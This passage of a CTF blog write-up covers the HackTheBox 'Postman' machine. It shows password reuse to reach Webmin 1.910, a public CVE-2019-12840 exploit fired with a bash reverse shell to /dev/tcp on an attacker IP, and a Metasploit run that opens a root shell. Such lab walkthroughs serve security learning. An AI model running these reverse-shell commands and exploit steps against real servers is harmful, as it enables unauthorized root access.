+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ su - Matt</span><br><span class="line">Password:</span><br><span class="line">Matt@Postman:~$ cat user.txt</span><br><span class="line">51xxxxxxxxxxxxxxxxxxxxxx3c</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Now that we have access to our user, let’s make a bit of recon to see if we can escalate our privileges to root. </p>
+<p>After a while we can not find anything worthy onto <code>Matt</code> account. Once again, when being stuck let’s go back at beginning to make sure we don’t forget anything. Remember that Webmin instance ? It must be there for a reason…</p>
+<p>Knowing that <code>Matt</code> reuse his password maybe we can be able to connect to Webmin using the same credentials (<code>Matt</code>:<code>computer2008</code>) ?</p>
+<p>Let’s try to login:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/71327015-402c5c00-2503-11ea-871c-0a5321984f47.png" alt="postman webmin login"></p>
+<p>Success! <code>We are in...</code></p>
+<p>From this control panel we can not access a lot… Only the <code>Software Package Updates</code> page. We can not seem to do anything interesting from there.</p>
+<p>Knowing from the <code>nmap</code> result and the page footer, the Webmin version is <code>1.910</code>, let’s see if some exploit have been published:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit webmin</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">DansGuardian Webmin Module 0.x - <span class="string">'edit.cgi'</span> Directory Trav | exploits/cgi/webapps/23535.txt</span><br><span class="line">Webmin - Brute Force / Command Execution                   | exploits/multiple/remote/705.pl</span><br><span class="line">Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofin | exploits/linux/remote/22275.pl</span><br><span class="line">Webmin 0.x - <span class="string">'RPC'</span> Privilege Escalation                    | exploits/linux/remote/21765.pl</span><br><span class="line">Webmin 0.x - Code Input Validation                         | exploits/linux/<span class="built_in">local</span>/21348.txt</span><br><span class="line">Webmin 1.5 - Brute Force / Command Execution               | exploits/multiple/remote/746.pl</span><br><span class="line">Webmin 1.5 - Web Brute Force (CGI)                         | exploits/multiple/remote/745.pl</span><br><span class="line">Webmin 1.580 - <span class="string">'/file/show.cgi'</span> Remote Command Execution ( | exploits/unix/remote/21851.rb</span><br><span class="line">Webmin 1.850 - Multiple Vulnerabilities                    | exploits/cgi/webapps/42989.txt</span><br><span class="line">Webmin 1.900 - Remote Command Execution (Metasploit)       | exploits/cgi/remote/46201.rb</span><br><span class="line">Webmin 1.910 - <span class="string">'Package Updates'</span> Remote Command Execution  | exploits/linux/remote/46984.rb</span><br><span class="line">Webmin 1.920 - Remote Code Execution                       | exploits/linux/webapps/47293.sh</span><br><span class="line">Webmin 1.920 - Unauthenticated Remote Code Execution (Meta | exploits/linux/remote/47230.rb</span><br><span class="line">Webmin 1.x - HTML Email Command Execution                  | exploits/cgi/webapps/24574.txt</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/2017.pl</span><br><span class="line">phpMyWebmin 1.0 - <span class="string">'target'</span> Remote File Inclusion           | exploits/php/webapps/2462.txt</span><br><span class="line">phpMyWebmin 1.0 - <span class="string">'window.php'</span> Remote File Inclusion       | exploits/php/webapps/2451.txt</span><br><span class="line">webmin 0.91 - Directory Traversal                          | exploits/cgi/remote/21183.txt</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>Well well, what do we have here… <code>Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution</code>. Sounds exactly what we need! Let’s try this one.</p>
+<p>This exploit first came as a Metasploit module, but since I try to avoid using Metasploit as much as possible I will use this <a href="https://github.com/bkaraceylan/CVE-2019-12840_POC" target="_blank" rel="noopener">Python version</a>.</p>
+<p>First, let’s open our netcat listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>And let’s launch the exploit (after reading the source code, no modification seems needed to make it work properly on this box):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/bkaraceylan/CVE-2019-12840_POC.git</span><br><span class="line">Cloning into <span class="string">'CVE-2019-12840_POC'</span>...</span><br><span class="line">Unpacking objects: 100% (10/10), <span class="keyword">done</span>.</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> CVE-2019-12840_POC</span><br><span class="line">[hg8@archbook ~]$ python exploit.py -u https://postman.htb -p 10000 -U Matt -P computer2008 -c <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1"</span></span><br><span class="line">[*] Attempting to login...</span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Executing payload...</span><br></pre></td></tr></table></figure>
+
+<p>Aaaand a new connection open on our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.160:54474</span><br><span class="line"></span><br><span class="line">root@Postman:/usr/share/webmin/package-updates/<span class="comment"># cd</span></span><br><span class="line">root@Postman:~<span class="comment"># cat root.txt</span></span><br><span class="line">a2xxxxxxxxxxxxxxxxxxxxxce</span><br></pre></td></tr></table></figure>
+
+<h2 id="Additional-information"><a href="#Additional-information" class="headerlink" title="Additional information"></a>Additional information</h2><p>For the CVE-2019-12840, Metasploit could have been used the following way:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ msfconsole</span><br><span class="line">msf5 &gt; use exploit/linux/http/webmin_packageup_rce</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.160</span><br><span class="line">RHOSTS =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> LHOST 10.10.10.10</span><br><span class="line">LHOST =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> username Matt</span><br><span class="line">username =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> payload cmd/unix/reverse_python</span><br><span class="line">payload =&gt; cmd/unix/reverse_python</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line">SSL =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   computer2008     yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME   Matt             yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_python):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.15.123     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  8585             yes       The listen port</span><br><span class="line">   SHELL  /bin/bash        yes       The system shell to use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> msf5 exploit(linux/http/webmin_packageup_rce) &gt; check</span><br><span class="line"></span><br><span class="line">[*] NICE! Matt has the right to &gt;&gt;Package Update&lt;&lt;</span><br><span class="line">[+] 10.10.10.160:10000 - The target is vulnerable.</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.10:8585</span><br><span class="line">[+] Session cookie: 0712c463a268f71262aa809eb4f41928</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.10.10:8585 -&gt; 10.10.10.160:38146) at 2019-11-05 02:07:59 +0100</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">a2xxxxxxxxxxxxxxxxxxxxxce</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/linux/">linux</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/cve-2019-12840/" rel="tag">cve-2019-12840</a>, <a class="tag-link" href="/tags/gobuster/" rel="tag">gobuster</a>, <a class="tag-link" href="/tags/john/" rel="tag">john</a>, <a class="tag-link" href="/tags/postman/" rel="tag">postman</a>, <a class="tag-link" href="/tags/redis/" rel="tag">redis</a>, <a class="tag-link" href="/tags/ssh/" rel="tag">ssh</a>, <a class="tag-link" href="/tags/webmin/" rel="tag">webmin</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-Redis-gt-Matt"><span class="toc-number">1.2.</span> <span class="toc-text">Pivot Redis -&gt; Matt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-information"><span class="toc-number">3.</span> <span class="toc-text">Additional information</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/postman/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/postman/&text=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/postman/&is_video=false&description=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Postman&body=Check out this article: https://hg8.sh/postman/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/postman/&title=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/postman/&name=HackTheBox - Postman&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/postman/&t=HackTheBox - Postman" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
